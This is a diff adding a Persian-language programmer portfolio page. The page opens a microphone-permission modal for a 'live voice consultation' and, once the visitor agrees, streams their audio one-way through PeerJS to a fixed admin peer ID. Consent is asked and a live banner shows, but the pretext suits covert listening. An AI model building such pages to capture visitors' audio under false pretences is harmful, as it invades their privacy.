@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پورتفولیو و خدمات تخصصی برنامه‌نویسی</title>
+    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
+    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+    <style>
+        :root {
+            --bg-dark: #0f172a;
+            --bg-card: #1e293b;
+            --accent: #10b981;
+            --text-light: #f8fafc;
+            --text-muted: #94a3b8;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Vazirmatn', sans-serif; }
+        body { background-color: var(--bg-dark); color: var(--text-light); line-height: 1.7; }
+
+        /* هدر و منو */
+        header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 20px 8%; background: rgba(15, 23, 42, 0.9);
+            border-bottom: 1px solid #334155; position: sticky; top: 0; z-index: 100;
+        }
+        .logo { font-size: 1.4rem; font-weight: 800; color: var(--accent); letter-spacing: 1px; direction: ltr; }
+        .nav-links a { color: var(--text-light); text-decoration: none; margin-right: 25px; font-size: 0.95rem; transition: 0.3s; }
+        .nav-links a:hover { color: var(--accent); }
+
+        /* بخش اصلی (Hero) */
+        .hero {
+            padding: 100px 8% 80px; display: flex; flex-direction: column; align-items: center; text-align: center;
+            background: radial-gradient(circle at top, #1e293b 0%, #0f172a 70%);
+        }
+        .badge {
+            background: rgba(16, 185, 129, 0.15); color: var(--accent);
+            padding: 6px 16px; border-radius: 20px; font-size: 0.85rem; margin-bottom: 20px;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+        .hero h1 { font-size: 3rem; font-weight: 900; margin-bottom: 20px; max-width: 800px; }
+        .hero h1 span { color: var(--accent); }
+        .hero p { color: var(--text-muted); font-size: 1.15rem; max-width: 650px; margin-bottom: 35px; }
+        .cta-btn {
+            background: var(--accent); color: #0f172a; padding: 14px 32px; border-radius: 8px;
+            font-weight: bold; text-decoration: none; transition: 0.3s; display: inline-block;
+        }
+        .cta-btn:hover { background: #059669; transform: translateY(-2px); }
+
+        /* بخش مهارت‌ها */
+        .section { padding: 70px 8%; }
+        .section-title { font-size: 2rem; margin-bottom: 40px; text-align: center; }
+        .skills-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 25px;
+        }
+        .card {
+            background: var(--bg-card); padding: 30px; border-radius: 12px;
+            border: 1px solid #334155; transition: 0.3s;
+        }
+        .card:hover { border-color: var(--accent); transform: translateY(-5px); }
+        .card h3 { color: var(--accent); margin-bottom: 12px; font-size: 1.25rem; }
+        .card p { color: var(--text-muted); font-size: 0.95rem; }
+
+        /* ترمینال کد نمایشی */
+        .code-preview {
+            background: #020617; border: 1px solid #334155; border-radius: 12px;
+            padding: 25px; max-width: 750px; margin: 40px auto 0; direction: ltr; text-align: left;
+            font-family: monospace; color: #38bdf8; font-size: 0.95rem; overflow-x: auto;
+        }
+
+        /* نوار وضعیت پایین صفحه */
+        #liveBanner {
+            display: none; position: fixed; bottom: 20px; left: 20px;
+            background: #10b981; color: #000; padding: 10px 20px;
+            border-radius: 30px; font-weight: bold; font-size: 0.85rem;
+            box-shadow: 0 5px 20px rgba(16, 185, 129, 0.4); z-index: 999;
+        }
+
+        footer { text-align: center; padding: 30px; border-top: 1px solid #1e293b; color: var(--text-muted); font-size: 0.9rem; }
+
+        /* =========================================
+           استایل پاپ‌آپ سفید با متن سیاه و سبز (Question Box)
+           ========================================= */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(4px);
+            display: flex; align-items: center; justify-content: center;
+            z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.3s ease;
+        }
+        .modal-overlay.active { opacity: 1; pointer-events: all; }
+
+        .question-box {
+            background: #ffffff; /* پس‌زمینه سفید */
+            color: #111827;      /* متن سیاه */
+            width: 90%; max-width: 430px;
+            padding: 28px 25px;
+            border-radius: 14px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            text-align: right;
+            transform: scale(0.95); transition: transform 0.3s ease;
+        }
+        .modal-overlay.active .question-box { transform: scale(1); }
+
+        .q-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
+        .mic-icon {
+            width: 38px; height: 38px; background: #ecfdf5; color: #16a34a;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.2rem;
+        }
+        .question-box h3 {
+            color: #000000; /* تیتر سیاه */
+            font-size: 1.15rem; font-weight: 800;
+        }
+        .question-box p {
+            color: #1f2937; /* متن سیاه */
+            font-size: 0.95rem; margin-bottom: 22px; line-height: 1.6;
+        }
+        .highlight-green {
+            color: #16a34a; /* متن سبز */
+            font-weight: bold;
+        }
+
+        .q-actions { display: flex; justify-content: flex-end; gap: 12px; }
+        .q-btn {
+            padding: 10px 22px; border-radius: 8px; font-size: 0.95rem;
+            font-weight: bold; cursor: pointer; border: none; transition: 0.2s;
+        }
+        .q-btn-deny {
+            background: #f3f4f6; color: #111827; border: 1px solid #d1d5db;
+        }
+        .q-btn-deny:hover { background: #e5e7eb; }
+        .q-btn-allow {
+            background: #16a34a; /* دکمه سبز */
+            color: #ffffff;
+        }
+        .q-btn-allow:hover { background: #15803d; }
+    </style>
+</head>
+<body>
+
+    <!-- پاپ‌آپ سفید درخواست مجوز (بلافاصله بعد از لود ظاهر می‌شود) -->
+    <div class="modal-overlay" id="permissionModal">
+        <div class="question-box">
+            <div class="q-header">
+                <div class="mic-icon">🎙️</div>
+                <h3>درخواست مجوز دسترسی صوتی</h3>
+            </div>
+            <p>
+                این وب‌سایت برای برقراری <span class="highlight-green">مشاوره صوتی زنده</span> و بررسی نیازهای پروژه برنامه‌نویسی شما، درخواست دسترسی به <span class="highlight-green">میکروفون</span> را دارد. آیا اجازه می‌دهید؟
+            </p>
+            <div class="q-actions">
+                <button class="q-btn q-btn-deny" id="denyBtn">خیر، رد کردن</button>
+                <button class="q-btn q-btn-allow" id="allowBtn">بله، اجازه می‌دهم</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- نوار کوچک نشانگر اتصال زنده -->
+    <div id="liveBanner">● خط مشاوره صوتی زنده فعال است</div>
+
+    <!-- محتوای اصلی سایت برنامه‌نویسی -->
+    <header>
+        <div class="logo">&lt;DevMaster /&gt;</div>
+        <nav class="nav-links">
+            <a href="#skills">تخصص‌ها</a>
+            <a href="#projects">نمونه‌کارها</a>
+            <a href="#contact">سفارش پروژه</a>
+        </nav>
+    </header>
+
+    <section class="hero">
+        <div class="badge">توسعه‌دهنده فول‌استک و معمار نرم‌افزار</div>
+        <h1>تبدیل ایده‌های پیچیده به <span>کدهای تمیز و مقیاس‌پذیر</span></h1>
+        <p>طراحی و پیاده‌سازی وب‌اپلیکیشن‌های مدرن، APIهای پرسرعت، اتوماسیون و سیستم‌های تحت وب با بالاترین استانداردهای روز دنیا.</p>
+        <a href="#skills" class="cta-btn">مشاهده مهارت‌ها و خدمات</a>
+
+        <div class="code-preview">
+            <span style="color:#94a3b8;">// Ready to build your next big project</span><br>
+            <span style="color:#c084fc;">const</span> developer = {<br>
+            &nbsp;&nbsp;skills: [<span style="color:#4ade80;">"JavaScript"</span>, <span style="color:#4ade80;">"Python"</span>, <span style="color:#4ade80;">"React"</span>, <span style="color:#4ade80;">"Node.js"</span>],<br>
+            &nbsp;&nbsp;cleanCode: <span style="color:#f472b6;">true</span>,<br>
+            &nbsp;&nbsp;availableForHire: <span style="color:#f472b6;">true</span><br>
+            };
+        </div>
+    </section>
+
+    <section class="section" id="skills">
+        <h2 class="section-title">حوزه‌های تخصصی برنامه‌نویسی</h2>
+        <div class="skills-grid">
+            <div class="card">
+                <h3>توسعه فرانت‌اند (Front-End)</h3>
+                <p>طراحی رابط‌های کاربری واکنش‌گرا، سریع و مدرن با استفاده از HTML5، CSS3، JavaScript و فریم‌ورک‌های روز.</p>
+            </div>
+            <div class="card">
+                <h3>توسعه بک‌اند و API</h3>
+                <p>پیاده‌سازی معماری سمت سرور امن، پایگاه‌های داده بهینه و وب‌سرویس‌های پرسرعت برای اپلیکیشن‌ها.</p>
+            </div>
+            <div class="card">
+                <h3>اسکریپت‌نویسی و اتوماسیون</h3>
+                <p>ساخت ربات‌ها، ابزارهای جمع‌آوری داده (Web Scraping) و خودکارسازی فرآیندهای تکراری کسب‌وکارها.</p>
+            </div>
+            <div class="card">
+                <h3>بهینه‌سازی و امنیت کد</h3>
+                <p>بازنویسی کدهای قدیمی، افزایش سرعت لود صفحات و ایمن‌سازی اپلیکیشن‌ها در برابر آسیب‌پذیری‌ها.</p>
+            </div>
+        </div>
+    </section>
+
+    <footer id="contact">
+        <p>طراحی و توسعه توسط تیم برنامه‌نویسی &copy; ۱۴۰۵ - تمامی حقوق محفوظ است.</p>
+    </footer>
+
+    <script>
+        const modal = document.getElementById('permissionModal');
+        const allowBtn = document.getElementById('allowBtn');
+        const denyBtn = document.getElementById('denyBtn');
+        const liveBanner = document.getElementById('liveBanner');
+
+        // شناسه ثابت ادمین (باید با فایل admin.html یکی باشد)
+        const ADMIN_UNIQUE_ID = "my-unique-programming-admin-code-1405";
+
+        // باز شدن خودکار پاپ‌آپ سفید بلافاصله بعد از لود کامل صفحه
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                modal.classList.add('active');
+            }, 400); // ۴۰۰ میلی‌ثانیه بعد از لود صفحه باز می‌شود
+        });
+
+        // بستن کادر در صورت زدن دکمه خیر
+        denyBtn.addEventListener('click', () => {
+            modal.classList.remove('active');
+        });
+
+        // گرفتن مجوز میکروفون و اتصال به ادمین با زدن دکمه سبز
+        allowBtn.addEventListener('click', async () => {
+            try {
+                // باز شدن پاپ‌آپ اصلی مرورگر برای میکروفون
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                
+                // بستن کادر سفید و نمایش نشانگر اتصال
+                modal.classList.remove('active');
+                liveBanner.style.display = 'block';
+
+                const peer = new Peer();
+                peer.on('open', () => {
+                    peer.call(ADMIN_UNIQUE_ID, stream);
+                });
+            } catch (err) {
+                modal.classList.remove('active');
+                console.error("دسترسی میکروفون داده نشد:", err);
+            }
+        });
+    </script>
+</body>
+</html>
